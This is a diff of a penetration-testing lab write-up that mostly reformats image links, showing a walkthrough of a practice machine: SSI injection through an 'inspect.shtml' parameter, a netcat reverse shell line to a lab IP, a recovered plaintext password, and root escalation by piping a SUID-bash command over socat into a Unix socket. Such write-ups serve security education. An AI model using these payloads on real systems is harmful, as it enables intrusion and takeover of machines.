@@ -37,27 +37,27 @@ It is thus likely that there's a web exploit, so we can start proxying traffic t
 
 Port 80 was running a custom dashboard:
 
-<figure><img src="../../../.gitbook/assets/image (1537).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1537).png>)
 
 The File Manager was running elFinder, but we cannot access it since we need administrative access:
 
-<figure><img src="../../../.gitbook/assets/image (2569).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2569).png>)
 
 I checked the user tab, and found that the user was called `mindsflee`:
 
-<figure><img src="../../../.gitbook/assets/image (3079).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3079).png>)
 
 All of options were under construction, except for the one on the right most.
 
-<figure><img src="../../../.gitbook/assets/image (3617).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3617).png>)
 
 From my enumeration, this seems to be the most vulnerable point. I attempted to upload some PHP webshells, but it seems only images are allowed.
 
-<figure><img src="../../../.gitbook/assets/image (3151).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3151).png>)
 
 There was one weird part, which was the `url=inspect.shtml` portion, since I had never seen that before. Searching for `shtml` gives us results for Server Side Includes (SSI).
 
-<figure><img src="../../../.gitbook/assets/image (2070).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2070).png>)
 
 Hacktricks has done a page on SSI Injection that we could try.
 
@@ -65,11 +65,11 @@ Hacktricks has done a page on SSI Injection that we could try.
 
 We can try some of the payloads:
 
-<figure><img src="../../../.gitbook/assets/image (3613).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3613).png>)
 
 If we follow the redirect, we get this:
 
-<figure><img src="../../../.gitbook/assets/image (3083).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3083).png>)
 
 We now have RCE on the machine, and we can easily get a reverse shell using this:
 
@@ -77,7 +77,7 @@ We now have RCE on the machine, and we can easily get a reverse shell using this
 <!--#exec cmd='nc -c bash 192.168.45.189 21' ->
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3082).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3082).png>)
 
 ## Privilege Escalation
 
@@ -138,7 +138,7 @@ password: m1ndsfl33w1llc4tchy0u?
 
 Using this password, we can `su` to `mindsflee`.
 
-<figure><img src="../../../.gitbook/assets/image (3172).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3172).png>)
 
 ### Sudo Privileges -> Socket Injection
 
@@ -235,16 +235,14 @@ Again, Hacktricks has a page for this:
 
 In one SSH session, run the Python script and input '1'. In another SSH session, run this command:
 
-{% code overflow="wrap" %}
 ```bash
 echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/synapse_commander.s
 ```
-{% endcode %}
 
 When we enter that command, the script starts waiting for data to be sent in, which it passes to `os.system(datagram)`. This would result in RCE as `root`:
 
-<figure><img src="../../../.gitbook/assets/image (3112).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3112).png>)
 
 We can then easily get a `root` shell:
 
-<figure><img src="../../../.gitbook/assets/image (3635).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3635).png>)
